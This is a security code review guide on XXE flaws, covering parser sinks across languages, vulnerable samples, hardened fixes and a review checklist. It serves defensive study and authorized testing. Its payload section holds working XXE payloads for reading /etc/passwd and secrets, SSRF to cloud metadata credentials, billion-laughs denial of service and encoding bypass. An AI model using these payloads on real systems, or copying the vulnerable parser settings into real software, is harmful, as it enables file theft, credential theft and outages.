---
title: Review XXE
keywords:
  - security code review
  - xxe
  - xml external entity
  - xml parsing
  - dtd
description: How to read code for XML External Entity flaws—trace attacker-controlled XML to parser settings and verify external entity resolution is disabled.
---

## 4.8 - Review XXE

XXE appears when XML parsers process attacker-controlled documents with external entities, DTDs, or XInclude enabled. Start from file upload handlers, SOAP endpoints, SAML assertions, and config import features. Trace each XML input to parser factory settings.

## What This Vulnerability Is

XML External Entity (XXE) is a server-side injection flaw in XML parsers. Documents may declare entities in a DTD that reference local files, internal services, or remote URLs. When the parser expands these entities, attacker-controlled XML can read sensitive files, perform SSRF, or cause denial of service through billion-laughs expansion.

The unsafe assumption is that XML input is benign structured data. Default parser configurations often enable entity expansion. This maps to [CWE-611](https://cwe.mitre.org/data/definitions/611.html) (Improper Restriction of XML External Entity Reference).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | File uploads, SOAP/SAML, RSS/Atom feeds, SVG, Office XML, config import, Ant/build parsers |
| **Input entry** | HTTP bodies, uploaded files, webhook XML, SAML metadata, batch import jobs |
| **Parser APIs** | DOM, SAX, StAX, `XmlReader`, lxml, JAXB, Jackson XML unmarshalling |
| **Factory defaults** | `newInstance()` without secure features; partial hardening that leaves DTDs enabled |
| **Transform chains** | XSLT, XPath against untrusted docs, schema validation that loads external DTDs |
| **Secondary parsers** | SVG metadata, Android plist, Excel/Word embedded XML parts |

## Attack Payloads

Use these in authorized tests when the application parses attacker-controlled XML. Confirm parser hardening before relying on file read or SSRF outcomes.

### Pattern 1: Classic external entity file read

```xml
<?xml version="1.0"?>
<!DOCTYPE saml [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion>&xxe;</saml:Assertion>
```

### Pattern 2: Parameter entity (blind / filtered contexts)

```xml
<!DOCTYPE response [
  <!ENTITY % ext SYSTEM "file:///var/www/app/config/database.yml">
  %ext;
]>
<soap:Envelope></soap:Envelope>
```

### Pattern 3: SSRF via external entity URL

```xml
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<rss>&xxe;</rss>
```

### Pattern 4: Billion laughs (DoS)

```xml
<!DOCTYPE invoice [
  <!ENTITY a "x">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<Invoice>&c;</Invoice>
```

### Pattern 5: XInclude file read

```xml
<config xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///app/secrets/api-keys.xml"/>
</config>
```

### Pattern 6: UTF-7 / encoding bypass (legacy parsers)

```xml
+ADw-!DOCTYPE saml +AFs-+AD4-
+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
```

## Language-Specific Sinks and Dangerous APIs

Search for XML parser construction without secure feature flags. Default factory settings often enable DTDs and external entities.

### Python

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=True)
etree.parse(user_file)  # lxml defaults may resolve entities

import xml.etree.ElementTree as ET
ET.parse(upload)  # stdlib — review defusedxml usage

from defusedxml import ElementTree as SafeET
SafeET.parse(upload)  # preferred — verify project uses this
```

### Java

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(inputStream);

SAXParserFactory spf = SAXParserFactory.newInstance();
spf.newSAXParser().parse(inputStream, handler);

XMLInputFactory xif = XMLInputFactory.newFactory();
xif.createXMLStreamReader(reader);
```

### C#

```csharp
var doc = new XmlDocument();
doc.LoadXml(userXml);  // XmlDocument resolves entities by default

var reader = XmlReader.Create(stream);  // without DtdProcessing.Prohibit
```

### JavaScript (Node.js)

```javascript
const libxml = require('libxmljs2');
libxml.parseXml(userXml);  // noent:true enables entities

const { DOMParser } = require('@xmldom/xmldom');
new DOMParser().parseFromString(userXml, 'text/xml');
```

### Go

```go
xml.Unmarshal(userBytes, &v)  // encoding/xml — review Decoder settings
decoder := xml.NewDecoder(bytes.NewReader(userBytes))
decoder.Strict = false
```

### C (libxml2)

```c
xmlReadMemory(buf, size, NULL, NULL, 0);  // default may fetch external entities
xmlCtxtReadDoc(ctxt, buf, NULL, NULL, XML_PARSE_DTDLOAD);
```

## Sample Vulnerable Code in Python

```python
from lxml import etree

def parse_saml_assertion(data: bytes):
    # Attacker-controlled SAML XML from SSO callback
    # Sink: external entities may resolve — file read or SSRF
    parser = etree.XMLParser(resolve_entities=True)
    return etree.fromstring(data, parser)
```

## Step-by-Step Review Walkthrough

1. **Search for XML parsing entry points.** Find DOM, SAX, lxml, ElementTree, and unmarshalling APIs for SOAP or SAML.
2. **Trace the Python (or equivalent) parse path.** In the sample, `resolve_entities=True` explicitly enables entity expansion. Ask whether DTDs and network fetches are blocked; they are not.
3. **Inspect parser factory configuration.** Note defaults when no hardening appears after `newInstance()` or parser construction.
4. **Review file upload types.** SVG, DOCX/XLSX (ZIP plus XML), RSS, Atom, and SAML metadata all contain XML that may carry DTDs.
5. **Check wrapper libraries.** JAXB, Jackson XML, and SimpleXML inherit underlying parser settings—verify overrides.
6. **Identify outbound requests during parsing.** External entity URLs imply SSRF risk alongside local file disclosure.
7. **Confirm tests include XXE payloads.** `<!ENTITY x SYSTEM "file:///etc/passwd">` on every parser code path.

## Risk Impact Analysis

**Local file disclosure.** External entities can read application secrets, credentials, and system files reachable by the parser process.

**SSRF and internal scanning.** Entity URLs may fetch cloud metadata, internal admin panels, or services on private networks.

**Denial of service.** Billion-laughs and quadratic entity expansion can exhaust memory and CPU during parse.

**Credential theft at scale.** Cloud instance metadata endpoints are a common XXE target when parsers can reach link-local addresses.

## Vulnerable Examples in Other Languages

### Java

```java
public Document parseSamlAssertion(InputStream in) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // defaults: external entities may be enabled depending on JDK/parser
    DocumentBuilder builder = dbf.newDocumentBuilder();
    return builder.parse(in);
}

public void parseSoapEnvelope(InputStream xml, InputStream xsl) throws Exception {
    TransformerFactory tf = TransformerFactory.newInstance();
    Transformer t = tf.newTransformer(new StreamSource(xsl));
    t.transform(new StreamSource(xml), new StreamResult(System.out));
}
```

### C#

```csharp
public XmlDocument ParseSamlResponse(string xml)
{
    var doc = new XmlDocument();
    doc.XmlResolver = new XmlUrlResolver(); // resolves external entities
    doc.LoadXml(xml);
    return doc;
}

public XDocument ParseRssFeed(Stream stream)
{
    return XDocument.Load(stream); // default settings may fetch external DTDs
}
```

### Go

```go
func parseSoapEnvelope(body []byte) error {
    // Third-party XML libs may expand entities if misconfigured
    doc, err := libxml.Parse(body, libxml.DefaultParserOptions)
    return err
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use defusedxml or hardened lxml settings. Disable entity resolution and network access.

```python
from defusedxml import ElementTree as ET

def parse_saml_assertion(data: bytes):
    return ET.fromstring(data)
```

```python
from lxml import etree

def parse_saml_hardened(data: bytes):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False,
    )
    return etree.fromstring(data, parser)
```

**Important:** Standard library `xml.etree.ElementTree` is safer than misconfigured lxml but defusedxml is the recommended drop-in for untrusted XML.

### Java

Disable DTDs and external entities on `DocumentBuilderFactory`.

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder builder = dbf.newDocumentBuilder();
return builder.parse(in);
```

**Important:** Partial hardening that disables only external entities while DTDs remain allowed is insufficient when DTDs are not required. Prefer `disallow-doctype-decl`.

### C#

Use `XmlReaderSettings` with DTD processing prohibited.

```csharp
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
using var reader = XmlReader.Create(stream, settings);
var doc = XDocument.Load(reader);
```

```csharp
// Legacy XmlDocument — avoid on untrusted input; if required:
var doc = new XmlDocument { XmlResolver = null };
using var reader = XmlReader.Create(stream, settings);
doc.Load(reader);
```

**Important:** Do not call `XDocument.Load(string)` or `XDocument.Load(stream)` on untrusted input without secure `XmlReader` settings.

### Go

Default `encoding/xml` does not resolve external entities. Audit third-party CGo bindings.

```go
import "encoding/xml"

func parseSamlAssertion(body []byte) (Assertion, error) {
    var env Assertion
    if bytes.Contains(body, []byte("<!DOCTYPE")) ||
       bytes.Contains(body, []byte("<!ENTITY")) {
        return env, errors.New("DOCTYPE/ENTITY not allowed")
    }
    err := xml.Unmarshal(body, &env)
    return env, err
}
```

**Important:** Reject documents containing `<!DOCTYPE` or `<!ENTITY` before third-party parsing when policy requires zero DTD support.

## Verify During Review

- Every XML parser sets `disallow-doctype-decl` or equivalent DTD prohibition on untrusted input.
- External general entities, parameter entities, and external DTD loading are disabled where DTDs must be supported.
- `XmlResolver` is null, `no_network=True`, or equivalent blocks outbound fetches during parse.
- XSLT and XPath processors use the same hardened reader settings as primary parsers.
- File upload filters that accept SVG, Office XML, or SAML assert XXE-safe parser configuration.
- Integration tests cover file disclosure and SSRF entity payloads for each parser code path.

## Reference

- [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [Python defusedxml](https://pypi.org/project/defusedxml/)
- [lxml XMLParser](https://lxml.de/apidoc/lxml.etree.html#lxml.etree.XMLParser)
- [Java DocumentBuilderFactory features](https://docs.oracle.com/en/java/javase/21/docs/api/java.xml/javax/xml/parsers/DocumentBuilderFactory.html)
- [OWASP XML External Entity Prevention — Java](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java)
- [XmlReaderSettings.DtdProcessing](https://learn.microsoft.com/en-us/dotnet/api/system.xml.xmlreadersettings.dtdprocessing)
- [Go encoding/xml package](https://pkg.go.dev/encoding/xml)
